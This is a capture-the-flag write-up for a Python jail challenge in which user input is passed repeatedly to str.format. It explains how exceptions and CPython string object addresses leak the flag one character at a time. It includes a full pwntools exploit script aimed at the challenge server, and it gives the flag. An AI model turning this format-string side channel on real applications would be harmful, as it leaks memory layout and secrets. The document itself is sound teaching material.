# format

Challenge:

```python
#!/usr/local/bin/python3
flag = open('flag.txt').read()
while True:
    try:
        flag = input('format: ').format(flag)
        print(flag)
    except:
        break
```

We need to leak the flag content via the exception side channel: by knowing when it throws, we can deduce the value. But how?

Read the format mini-language used by `str.format`, it can access `{0[index]}` or `{0.field}`. So, we need to distinguish the different values. Then, we can deduce the string length by `{0[3]}`, so if the string length is too short, it will throw. Also, we can expand it recursively, so we can deduce if a byte is a number by `{0:{0[index]}}`.

However, how about the non-numbers? CPython has small integer optimization:

```python
>>> "1".__str__
<method-wrapper '__str__' of str object at 0xa50e08>
>>> "2".__str__
<method-wrapper '__str__' of str object at 0xa50e38>
>>> "a".__str__
<method-wrapper '__str__' of str object at 0xa51708>
```

The address of the one-byte string is fixed! And they are equally placed with an offset of 0x30. If we can recover the address, then profit.

However, currently, we can only deduce a number by `{0:{0[index]}}` and `{0[length]}`, but the address is in hex. Moreover, when the script is run, ASLR is in effect, so only the lowest 12 bits are fixed.

So, we manually listed the lowest 12 bit address of the numbers:

- 0: 0e8
- 1: 118
- 2: 148
- 3: 178
- 4: 1a8
- 5: 1d8
- 6: 208
- 7: 238
- 8: 268
- 9: 298
- a: a18
- b: a48
- c: a78
- d: aa8
- e: ad8
- f: b08

Although we cannot distinguish all the numbers in one run, we can do in multiple passes:

1. Get address of `flag[index]`, examine its lowest 12 bits. First, we find all numbers by probing `{0[guess]}`; note that to distinguish between `0` and `1`, an extra probe is required by computing address of `0` or `1`, and then extra the lowest 12 bits to tell which is which;
2. Second, to find the hex parts, compute lowest 12 bits of their address, and then we only have six cases: `a18/a48/a78/aa8/ad8/b08`, we just add probe for each case

The detailed solution:

1. For each byte in flag:
2. For every byte of the lowest 12 bits of the flag byte's address: `[54:57]` of `{0[index].__add__}`:
3. First, guess the numbers by length: `{0[0]:{0[54]}}` and probe `{0[guess]}` from 1 to 9. For example, when it fails when `guess == 4`, we can tell that the address digit is `4`; To tell `0` from `1`, use an extra query: `{0[bit].__add__}` then `{0[0]:{0[55]}}`, which will fail for `0` (0x0e8)
4. Second, for hex numbers, compute `{0[bit].__add__}` and then `{0[54].__add__}`, so we know that it is `a` or `b` in the first digit. Next, do the same thing for the second digit: `{0[0]:{0[55]}}` and then use `{0[guess]}` to probe the second digit. Eventually, we can distinguish all `a-f` possibilitiy.

Attack code:

```python
from pwn import *

# mapping found locally:
# 0 0e8(1x8)
# 1 118
# 2 148
# 3 178
# 4 1a8(1x8)
# 5 1d8(1x8)
# 6 208
# 7 238
# 8 268
# 9 298
# a a18(x18)
# b a48
# c a78
# d aa8(xx8)
# e ad8
# f b08

# for 0-9: find by length
# for a-f: compute its addr, match by last three


def connect():
    # p = process(["python3", "chal.py"])
    p = remote("challs.pyjail.club", port=27150)
    # p = remote("127.0.0.1", port=5000)
    return p


context.log_level = "debug"
addrs = []
length = 60
finish = False
for index in range(length):
    if finish:
        break
    addr = ["0"] * 3
    for j in range(3):
        if finish:
            break
        for guess in range(1, 10):
            p = connect()
            p.recvuntil(b"format: ")
            # 1. extract the char and get its __add__
            p.sendline(f"{{0[{index}].__add__}}".encode())
            # 2. get it's address
            try:
                p.recvuntil(b"format: ")
            except:
                finish = True
                break
            p.sendline(f"{{0[0]:{{0[{j+54}]}}}}".encode())
            # 3. guess length
            try:
                p.recvuntil(b"format: ")
            except:
                # hex
                p.close()
                # first, probe its addr[-3]
                p = connect()
                # 1. extract the char and get its __add__
                p.recvuntil(b"format: ")
                p.sendline(f"{{0[{index}].__add__}}".encode())
                # 2. check addr[-3]
                p.recvuntil(b"format: ")
                p.sendline(f"{{0[{j+54}].__add__}}".encode())
                p.recvuntil(b"format: ")
                p.sendline(f"{{0[54].__add__}}".encode())
                p.recvuntil(b"format: ")
                a_or_b = None
                try:
                    p.sendline(f"{{0[0]:{{0[55]}}}}".encode())
                    p.recvuntil(b"format: ")
                    p.sendline(f"{{0[3]:}}".encode())
                    p.recvuntil(b"format: ")
                    # good
                    a_or_b = "b"
                except:
                    # fail
                    a_or_b = "a"
                p.close()

                # next, find addr[-2]
                p = connect()
                # 1. extract the char and get its __add__
                p.recvuntil(b"format: ")
                p.sendline(f"{{0[{index}].__add__}}".encode())
                # 2. check addr[-2]
                p.recvuntil(b"format: ")
                p.sendline(f"{{0[{j+54}].__add__}}".encode())
                p.recvuntil(b"format: ")
                good_2 = False
                good_3 = False
                good_4 = False
                try:
                    p.sendline(f"{{0[0]:{{0[55]}}}}".encode())
                    p.recvuntil(b"format: ")
                    good_2 = True
                    p.sendline(f"{{0}}{{0[3]}}".encode())
                    p.recvuntil(b"format: ")
                    good_3 = True
                    p.sendline(f"{{0[6]}}".encode())
                    p.recvuntil(b"format: ")
                    good_4 = True
                except:
                    pass
                p.close()
                p = connect()
                # 1. extract the char and get its __add__
                p.recvuntil(b"format: ")
                p.sendline(f"{{0[{index}].__add__}}".encode())
                # 2. check addr[-2]
                p.recvuntil(b"format: ")
                p.sendline(f"{{0[{j+54}].__add__}}".encode())
                p.recvuntil(b"format: ")
                good_6 = False
                try:
                    p.sendline(f"{{0[55].__add__}}".encode())
                    p.recvuntil(b"format: ")
                    p.sendline(f"{{0[0]:{{0[55]}}}}".encode())
                    p.recvuntil(b"format: ")
                    good_6 = True
                except:
                    pass
                p.close()

                if a_or_b == "a" and good_2 == True and good_3 == False:
                    addr[j] = "a"
                elif (
                    a_or_b == "a"
                    and good_2 == True
                    and good_3 == True
                    and good_4 == False
                ):
                    addr[j] = "b"
                elif (
                    a_or_b == "a"
                    and good_2 == True
                    and good_3 == True
                    and good_4 == True
                ):
                    addr[j] = "c"
                elif a_or_b == "a" and good_2 == False and good_6 == True:
                    addr[j] = "d"
                elif a_or_b == "a" and good_2 == False and good_6 == False:
                    addr[j] = "e"
                elif a_or_b == "b":
                    addr[j] = "f"
                else:
                    addr[j] = str("x")
                break
            p.sendline(f"{{0[{guess}]}}".encode())
            try:
                p.recvuntil(b"format: ")
                good = True
            except:
                good = False
            p.close()
            if not good:
                if guess == 1:
                    # distinguish between 0 and 1
                    # 0: 0e8
                    # 1: 118
                    p = connect()
                    # 1. extract the char and get its __add__
                    p.recvuntil(b"format: ")
                    p.sendline(f"{{0[{index}].__add__}}".encode())
                    # 2. check if addr[-2] hex?
                    p.recvuntil(b"format: ")
                    p.sendline(f"{{0[{j+54}].__add__}}".encode())
                    p.recvuntil(b"format: ")
                    try:
                        p.sendline(f"{{0[0]:{{0[55]}}}}".encode())
                        p.recvuntil(b"format: ")
                        # good
                        guess = 1
                    except:
                        # fail
                        guess = 0
                    p.close()
                addr[j] = str(guess)
                break
        print("".join(addr))
    if not finish:
        addrs.append("".join(addr))

    # recover
    ans = ""
    for i in range(length):
        if i < len(addrs):
            value = chr(ord("0") + (int(addrs[i], 16) - 0x0E8) // 0x30)
            print(i, addrs[i], value)
            ans += value
    print("ans", ans)
```

Flag: `jail{a_PIE_leak_is_all_you_need_SW4CrB4q6gA}`.
